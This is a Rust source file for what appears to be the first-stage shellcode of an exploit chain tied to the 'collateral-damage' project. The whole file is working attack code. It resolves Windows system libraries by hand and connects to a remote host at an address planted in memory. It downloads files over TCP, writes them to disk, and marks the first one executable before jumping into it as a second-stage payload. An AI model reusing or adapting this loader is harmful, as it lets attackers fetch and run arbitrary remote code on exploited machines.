#![feature(allocator_api)]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(overflowing_literals)]
#![no_std]
#![no_main]

use windows_sys::Win32::Foundation::GENERIC_WRITE;
use windows_sys::Win32::Foundation::HANDLE;

use core::arch::asm;
use core::ffi::c_int;
use core::ffi::c_void;
use core::mem::MaybeUninit;
use core::panic::PanicInfo;

use shellcode_utils::allocators::WinVirtualAlloc;
use shellcode_utils::prelude::*;
use windows_sys::Win32::Networking::WinSock::AF_INET;
use windows_sys::Win32::Networking::WinSock::IN_ADDR;
use windows_sys::Win32::Networking::WinSock::IPPROTO_TCP;
use windows_sys::Win32::Networking::WinSock::SOCKADDR_IN;
use windows_sys::Win32::Networking::WinSock::SOCK_STREAM;
use windows_sys::Win32::Networking::WinSock::WSADATA;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

type Stage2Fn = fn(*const ShellcodeArgs) -> u64;

const STAGE3_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\"#, "\0");

// 404 (not found error codes)
const STAGE1_KERNELBASE_NOT_FOUND: u64 = 0x100001404;
const STAGE1_WS2_NOT_FOUND: u64 = 0x100002404;

const STAGE1_READ_STAGE2_LEN_FAILED: u64 = 0x10000002;
const STAGE1_READ_STAGE2_FAILED: u64 = 0x10000003;

const STAGE1_READ_EXE_LEN_FAILED: u64 = 0x10000004;
const STAGE1_READ_EXE_FAILED: u64 = 0x10000005;
const STAGE1_READ_FILENAME_FAILED: u64 = 0x10000006;

const GLOBAL_INFO: u64 = 0x44000000;

// struct representing the info passed in from gamescript at a static address
// Reference: https://github.com/exploits-forsale/collateral-damage/blob/f39189558e97c0e3418d7f328604cb66a52dba5b/collat_payload/collat_payload.c#L20C1-L20C78
#[repr(C)]
struct COLLAT_INFO {
    ip_addr: [u8; 0x20],
}

#[used]
#[no_mangle]
// Required because compiler_builtins expects this symbol to be present
// and they only define it for UEFI environments
pub static _fltused: i32 = 0;

#[no_mangle]
pub extern "C" fn main() -> u64 {
    unsafe { asm!("and rsp, ~0xf") };

    // Kernelbase is required for just about everything
    let kernelbase_ptr = get_kernelbase();
    if kernelbase_ptr.is_none() {
        return STAGE1_KERNELBASE_NOT_FOUND;
    }
    let kernelbase_ptr = kernelbase_ptr.unwrap();

    // Get WS2 so that we can use sockets
    let ws2_ptr = fetch_ws2_32(kernelbase_ptr);
    if ws2_ptr.is_none() {
        return STAGE1_WS2_NOT_FOUND;
    }
    let ws2_ptr = ws2_ptr.unwrap();

    // Kernelbase imports
    let VirtualAlloc = fetch_virtual_alloc(kernelbase_ptr);
    let VirtualFree = fetch_virtual_free(kernelbase_ptr);
    let VirtualProtect = fetch_virtual_protect(kernelbase_ptr);
    let CreateFile = fetch_create_file(kernelbase_ptr);
    let ReadFile = fetch_read_file(kernelbase_ptr);
    let WriteFile = fetch_write_file(kernelbase_ptr);
    let CloseHandle = fetch_close_handle(kernelbase_ptr);
    let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernelbase_ptr);
    // Only used on PC for debugging with WinDbg attached
    #[cfg(feature = "debug")]
    let OutputDebugStringA = fetch_output_debug_string(kernelbase_ptr);

    // WS2 imports
    let wsa_startup = fetch_wsa_startup(ws2_ptr);
    let wsa_socket = fetch_wsa_socket(ws2_ptr);
    let wsa_connect = fetch_wsa_connect(ws2_ptr);
    let inet_addr = fetch_inet_addr(ws2_ptr);

    macro_rules! debug_print {
        ($msg:expr) => {
            #[cfg(feature = "debug")]
            unsafe {
                OutputDebugStringA(concat!($msg, "\n\0").as_ptr() as _)
            }
        };
    }
    debug_print!("Hello from stage1");

    let mut stage2_len = 0;
    let mut stage2_mem: *mut c_void = core::ptr::null_mut();

    unsafe {
        let mut wsa_data: MaybeUninit<WSADATA> = MaybeUninit::uninit();
        (wsa_startup)((2 << 8) | 2, wsa_data.as_mut_ptr());

        let socket = (wsa_socket)(
            AF_INET as c_int,
            SOCK_STREAM,
            IPPROTO_TCP,
            core::ptr::null(),
            core::ptr::null(),
            0,
        );

        let collat_info_ptr = GLOBAL_INFO as *mut COLLAT_INFO;
        let collat_info_ref: &mut COLLAT_INFO = collat_info_ptr.as_mut().unwrap();

        let sockaddr = SOCKADDR_IN {
            sin_family: AF_INET,
            sin_port: u16::from_le_bytes(8080u16.to_be_bytes()),
            sin_addr: IN_ADDR {
                S_un: windows_sys::Win32::Networking::WinSock::IN_ADDR_0 {
                    S_addr: (inet_addr)(collat_info_ref.ip_addr.as_ptr() as *const _),
                },
            },
            sin_zero: [0u8; 8],
        };

        (wsa_connect)(
            socket,
            core::mem::transmute(&sockaddr),
            core::mem::size_of_val(&sockaddr) as i32,
            core::ptr::null(),
            core::ptr::null_mut(),
            core::ptr::null(),
            core::ptr::null(),
        );

        // Download files until the server has no more
        loop {
            // NOTE:
            // THIS DATA STRUCTURE MUST BE SYNCED WITH THE NETWORK DELIVERY SERVER IF CHANGED
            #[repr(packed)]
            struct DynamicFile {
                file_len: [u8; 4],
                name_len: [u8; 4],
            }

            let mut file_info: MaybeUninit<DynamicFile> = MaybeUninit::uninit();

            let mut bytes_read = 0u32;
            if (ReadFile)(
                socket as HANDLE,
                file_info.as_mut_ptr() as *mut _,
                core::mem::size_of_val(&file_info) as u32,
                &mut bytes_read as *mut _,
                core::ptr::null_mut(),
            ) == 0
            {
                return STAGE1_READ_EXE_LEN_FAILED;
            }

            let file_info = file_info.assume_init();
            let file_len = u32::from_be_bytes(file_info.file_len) as usize;
            let file_name_len = u32::from_be_bytes(file_info.name_len) as usize;

            if file_len == 0 || file_name_len == 0 {
                break;
            }

            const MAX_FILE_NAME_LEN: usize = 20;
            // Make sure that the file name can fit into this buffer
            if file_name_len >= MAX_FILE_NAME_LEN {
                return STAGE1_READ_FILENAME_FAILED;
            }

            let mut file_stem = MaybeUninit::<[u8; MAX_FILE_NAME_LEN]>::uninit();

            let mut remaining = file_name_len as isize;
            while remaining > 0 {
                if (ReadFile)(
                    socket as HANDLE,
                    (file_stem.as_mut_ptr() as *const u8).offset(file_name_len as isize - remaining)
                        as *mut _,
                    remaining as u32,
                    &mut bytes_read as *mut _,
                    core::ptr::null_mut(),
                ) == 0
                {
                    return STAGE1_READ_FILENAME_FAILED;
                }

                remaining -= bytes_read as isize;
            }

            // Allocate some memory for the actual file.
            let file_mem = (VirtualAlloc)(core::ptr::null(), file_len, 0x00001000, 0x4);

            let mut remaining = file_len as isize;
            while remaining > 0 {
                if (ReadFile)(
                    socket as HANDLE,
                    file_mem.offset(file_len as isize - remaining) as *mut _,
                    remaining as u32,
                    &mut bytes_read as *mut _,
                    core::ptr::null_mut(),
                ) == 0
                {
                    return STAGE1_READ_EXE_FAILED;
                }

                remaining -= bytes_read as isize;
            }

            // Try to create run.exe or whatever file we're receiving
            let mut full_file_name: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();

            // First expand the environment variables...
            let written_count = (ExpandEnvironmentStringsA)(
                STAGE3_ENV_FILENAME.as_ptr(),
                full_file_name.as_mut_ptr() as *mut _,
                core::mem::size_of_val(&full_file_name) as u32,
            );

            // Append the file stem to the filename
            (full_file_name.as_mut_ptr() as *mut u8)
                .offset((written_count - 1) as isize)
                .copy_from_nonoverlapping(file_stem.as_ptr() as *const _, file_name_len);

            (full_file_name.as_mut_ptr() as *mut u8)
                .offset((written_count - 1) as isize + file_name_len as isize)
                .write(0x0);

            // Create the output file
            let file_handle = (CreateFile)(
                full_file_name.as_ptr() as *const _, // Filename
                GENERIC_WRITE,                       // Desired access
                0,                                   // ShareMode
                core::ptr::null_mut() as PVOID,      // Security attributes
                2,                                   // CREATE_ALWAYS
                0x80,                                // FILE_ATTRIBUTE_NORMAL
                core::ptr::null_mut() as PVOID,      // hTemplateFile
            );

            // Finally, write the file
            let mut bytes_written = 0u32;
            let mut remaining = file_len as isize;
            while remaining > 0 {
                (WriteFile)(
                    file_handle,
                    file_mem as *const _,
                    file_len as u32,
                    &mut bytes_written as *mut _,
                    core::ptr::null_mut(),
                );
                remaining -= bytes_written as isize;
            }

            if stage2_mem.is_null() {
                stage2_mem = file_mem;
                stage2_len = file_len;
            } else {
                (VirtualFree)(file_mem, 0, 0x00008000);
            }

            (CloseHandle)(file_handle);
        }

        (CloseHandle)(socket as HANDLE);
    }

    // Change the stage 2 payload's permissions to be executable
    debug_print!("Changing stage2 permissions");
    let mut old_flags = 0u32;
    unsafe {
        (VirtualProtect)(
            stage2_mem as *const _,
            stage2_len,
            0x20,
            &mut old_flags as *mut _,
        );
    }

    debug_print!("Executing stage2");

    if stage2_mem.is_null() || stage2_len == 0 {
        return STAGE1_READ_STAGE2_FAILED;
    }

    let stage2: Stage2Fn = unsafe { core::mem::transmute(stage2_mem) };
    stage2(core::ptr::null())
}

// #[allow(unused_attributes)]
// #[cfg(target_env = "msvc")]
// #[link_args = "/GS- /MERGE:.rdata=.text /MERGE:.pdata=.text /NODEFAULTLIB /EMITPOGOPHASEINFO /DEBUG:NONE"]
// extern "C" {}
